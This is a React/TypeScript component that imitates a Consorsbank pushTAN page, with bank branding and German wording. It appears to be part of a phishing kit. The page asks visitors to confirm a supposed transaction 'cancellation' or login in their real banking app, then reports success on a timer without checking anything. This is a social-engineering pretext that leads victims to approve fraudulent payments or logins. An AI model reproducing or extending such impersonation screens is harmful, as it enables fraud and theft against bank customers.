import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface PushTANScreenProps {
  tanType: TANType;
  transactionDetails?: TransactionDetails;
  onConfirm: () => void;
  onCancel?: () => void;
}

const PushTANScreen: React.FC<PushTANScreenProps> = ({ 
  tanType,
  transactionDetails = {}, 
  onConfirm, 
  onCancel
}) => {
  const [isWaiting, setIsWaiting] = useState(true);
  const [countdown, setCountdown] = useState(120);
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsWaiting(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleConfirm = async () => {
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsLoading(false);
    onConfirm();
  };

  if (isLoading) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'pushTAN wird verarbeitet...'}
        type="processing"
      />
    );
  }

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
      color: '#000000',
      WebkitFontSmoothing: 'antialiased',
      fontFeatureSettings: '"ss05" 1'
    }}>
      <div style={{
        maxWidth: '1200px',
        margin: '0 auto',
        padding: isMobile ? '20px' : '40px 20px 60px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        minHeight: '100vh',
        justifyContent: 'center'
      }}>
        
        {/* Main TAN Card */}
        <div style={{
          width: '100%',
          maxWidth: '600px',
          backgroundColor: '#ffffff',
          border: '1px solid #d1d1d1',
          borderRadius: '8px',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
          overflow: 'hidden'
        }}>
          
          {/* Header Section */}
          <div style={{
            backgroundColor: '#f5f5f5',
            padding: isMobile ? '20px' : '30px',
            borderBottom: '1px solid #d1d1d1'
          }}>
            <h1 style={{
              color: '#0080a6',
              fontSize: isMobile ? '1.75rem' : '2.5rem',
              fontWeight: '650',
              margin: '0',
              fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
              textAlign: 'center',
              lineHeight: '120%'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'pushTAN Stornierung' : 'pushTAN Anmeldung'}
            </h1>
          </div>

          {/* Main Content */}
          <div style={{
            padding: isMobile ? '20px' : '30px'
          }}>
            
            {/* Instruction Box */}
            <div style={{
              backgroundColor: '#f5f5f5',
              border: '1px solid #d1d1d1',
              borderRadius: '4px',
              padding: '20px',
              marginBottom: '30px',
              textAlign: 'center'
            }}>
              <p style={{
                margin: '0',
                fontSize: isMobile ? '14px' : '16px',
                color: '#000000',
                fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                lineHeight: '140%'
              }}>
                {tanType === 'TRANSACTION_TAN' 
                  ? 'Bestätigen Sie die Stornierung der Transaktion in Ihrer Consorsbank Banking-App.'
                  : 'Bestätigen Sie Ihren Anmeldeversuch in Ihrer Consorsbank Banking-App.'
                }
              </p>
            </div>

            {/* Transaction Details Card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div style={{
                backgroundColor: '#ffffff',
                border: '2px solid #0080a6',
                borderRadius: '4px',
                padding: '25px',
                marginBottom: '30px'
              }}>
                <h2 style={{
                  color: '#0080a6',
                  fontSize: isMobile ? '1.25rem' : '1.5rem',
                  fontWeight: '650',
                  margin: '0 0 20px 0',
                  fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                  textAlign: 'center',
                  lineHeight: '120%'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '10px',
                    borderBottom: '1px solid #d1d1d1'
                  }}>
                    <span style={{
                      color: '#464646',
                      fontSize: '14px',
                      fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                      fontWeight: '400'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#0080a6',
                      fontSize: '18px',
                      fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                      fontWeight: '650'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #d1d1d1'
                    }}>
                      <span style={{
                        color: '#464646',
                        fontSize: '14px',
                        fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                        fontWeight: '400'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#000000',
                        fontSize: '14px',
                        fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #d1d1d1'
                    }}>
                      <span style={{
                        color: '#464646',
                        fontSize: '14px',
                        fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                        fontWeight: '400'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#000000',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#464646',
                        fontSize: '14px',
                        fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                        fontWeight: '400'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#000000',
                        fontSize: '14px',
                        fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Status Section */}
            <div style={{
              backgroundColor: '#f5f5f5',
              border: '1px solid #d1d1d1',
              borderRadius: '4px',
              padding: '30px',
              textAlign: 'center',
              marginBottom: '30px'
            }}>
              {isWaiting ? (
                <div>
                  {/* Consorsbank Loading Spinner */}
                  <div style={{
                    width: '50px',
                    height: '50px',
                    border: '4px solid #d1d1d1',
                    borderTop: '4px solid #0080a6',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite',
                    margin: '0 auto 25px auto'
                  }} />
                  
                  <h3 style={{
                    color: '#0080a6',
                    fontSize: isMobile ? '1.125rem' : '1.25rem',
                    fontWeight: '650',
                    margin: '0 0 15px 0',
                    fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                    lineHeight: '120%'
                  }}>
                    {tanType === 'TRANSACTION_TAN' ? 'Warten auf Stornierung...' : 'Warten auf Anmeldung...'}
                  </h3>
                  
                  <p style={{
                    color: '#464646',
                    fontSize: '14px',
                    margin: '0 0 15px 0',
                    fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                    lineHeight: '140%'
                  }}>
                    Bitte bestätigen Sie in Ihrer Consorsbank App.
                  </p>
                  
                  <p style={{
                    color: '#e42448',
                    fontSize: '14px',
                    margin: '0',
                    fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                    fontWeight: '500',
                    lineHeight: '140%'
                  }}>
                    Timeout in: {formatTime(countdown)}
                  </p>
                </div>
              ) : (
                <div>
                  {/* Success Icon */}
                  <div style={{
                    width: '50px',
                    height: '50px',
                    backgroundColor: '#28a745',
                    borderRadius: '50%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    margin: '0 auto 25px auto'
                  }}>
                    <svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3">
                      <path d="M20 6L9 17l-5-5"/>
                    </svg>
                  </div>
                  
                  <h3 style={{
                    color: '#28a745',
                    fontSize: isMobile ? '1.125rem' : '1.25rem',
                    fontWeight: '650',
                    margin: '0 0 15px 0',
                    fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                    lineHeight: '120%'
                  }}>
                    {tanType === 'TRANSACTION_TAN' ? 'Transaktion storniert' : 'Anmeldung bestätigt'}
                  </h3>
                  
                  <p style={{
                    color: '#000000',
                    fontSize: '14px',
                    margin: '0',
                    fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                    lineHeight: '140%'
                  }}>
                    Sie können nun fortfahren.
                  </p>
                </div>
              )}
            </div>

            {/* Action Buttons */}
            <div style={{
              display: 'flex',
              flexDirection: isMobile ? 'column' : 'row',
              justifyContent: 'center',
              alignItems: 'center',
              gap: '15px',
              marginBottom: '20px'
            }}>
              <button
                onClick={handleConfirm}
                disabled={isLoading}
                style={{
                  backgroundColor: isLoading ? '#d1d1d1' : '#0080a6',
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '14px 28px',
                  fontSize: '16px',
                  fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                  fontWeight: '500',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  transition: 'background-color 0.2s ease',
                  width: isMobile ? '100%' : 'auto',
                  minWidth: '180px',
                  lineHeight: '140%'
                }}
                onMouseEnter={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#05a9c3';
                  }
                }}
                onMouseLeave={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#0080a6';
                  }
                }}
              >
                {isWaiting 
                  ? (tanType === 'TRANSACTION_TAN' ? 'Manuell stornieren' : 'Manuell bestätigen')
                  : 'Weiter'
                }
              </button>
              
              {onCancel && (
                <button
                  onClick={onCancel}
                  style={{
                    backgroundColor: 'transparent',
                    color: '#0080a6',
                    border: '2px solid #0080a6',
                    borderRadius: '4px',
                    padding: '12px 26px',
                    fontSize: '16px',
                    fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                    fontWeight: '500',
                    cursor: 'pointer',
                    transition: 'all 0.2s ease',
                    width: isMobile ? '100%' : 'auto',
                    minWidth: '180px',
                    lineHeight: '140%'
                  }}
                  onMouseEnter={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#0080a6';
                    (e.target as HTMLButtonElement).style.color = '#ffffff';
                  }}
                  onMouseLeave={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                    (e.target as HTMLButtonElement).style.color = '#0080a6';
                  }}
                >
                  {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                </button>
              )}
            </div>

            {/* Footer Info */}
            <div style={{ textAlign: 'center' }}>
              <p style={{
                color: '#464646',
                fontSize: '12px',
                margin: '0',
                fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                lineHeight: '140%'
              }}>
                Probleme mit der App? Kontaktieren Sie den Consorsbank Kundenservice.
              </p>
            </div>
          </div>
        </div>
      </div>

      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export { PushTANScreen };
